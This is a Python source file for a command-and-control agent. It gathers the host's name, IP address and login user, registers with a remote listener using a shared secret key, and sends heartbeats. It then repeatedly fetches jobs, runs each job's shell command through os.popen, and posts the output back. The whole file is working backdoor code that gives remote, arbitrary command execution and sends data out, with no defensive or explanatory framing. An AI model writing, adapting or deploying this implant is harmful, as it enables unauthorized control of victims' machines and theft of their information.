import os
import socket
import requests
import time
import threading

LISTENER_IP = "127.0.0.1"  # Adjust as necessary
LISTENER_PORT = 8903  # Adjust to match your listener's port
SECRET_KEY = "PASSWORD"  # Adjust to match your listener's secret key

AGENT_ID = None  # This will be set upon registration

def gather_info():
    """Gather basic info from the agent machine."""
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    username = os.getlogin()
    return {
        "hostname": hostname,
        "ip_address": ip_address,
        "username": username
    }

def register_with_listener():
    """Send agent data to the listener for registration."""
    global AGENT_ID
    agent_data = gather_info()
    headers = {
        'X-Secret-Key': SECRET_KEY,
        'Content-Type': 'application/json'
    }
    response = requests.post(f"http://{LISTENER_IP}:{LISTENER_PORT}/tag", headers=headers, json=agent_data)
    
    if response.status_code == 200:
        AGENT_ID = response.json()['agent_id']
        print(f"Successfully registered with ID: {AGENT_ID}")
    else:
        print("Registration failed:", response.text)

def heartbeat_with_listener():
    """Regularly send a heartbeat to the listener."""
    headers = {
        'X-Secret-Key': SECRET_KEY
    }
    while True:
        try:
            response = requests.get(f"http://{LISTENER_IP}:{LISTENER_PORT}/beat", headers=headers)
            if response.status_code == 200:
                print("[+] Heartbeat acknowledged by server")
            else:
                print("[-] Heartbeat failed:", response.text)
        except Exception as e:
            print("[-] Heartbeat error:", str(e))
        time.sleep(10)  # Sleep for 10 seconds before next heartbeat

def command_loop():
    headers = {
        'X-Secret-Key': SECRET_KEY
    }
    while True:
        try:
            # Fetching jobs from listener
            response = requests.get(f"http://{LISTENER_IP}:{LISTENER_PORT}/jobs/{AGENT_ID}", headers=headers)
            jobs = response.json()
            for job in jobs:
                result = os.popen(job['command']).read()
                print(result)  # Display the result on the agent side
                
                # Send result back to the server
                data = {
                    'job_id': job['_id'],
                    'output': result
                }
                result_response = requests.post(f"http://{LISTENER_IP}:{LISTENER_PORT}/job_result", headers=headers, json=data)
                print(result_response.text)  # Display the response from the server regarding the result

        except Exception as e:
            print("[-] Command loop error:", str(e))
        time.sleep(5)

if __name__ == "__main__":
    register_with_listener()

    # Start the heartbeat and command loops in separate threads
    threading.Thread(target=heartbeat_with_listener).start()
    threading.Thread(target=command_loop).start()
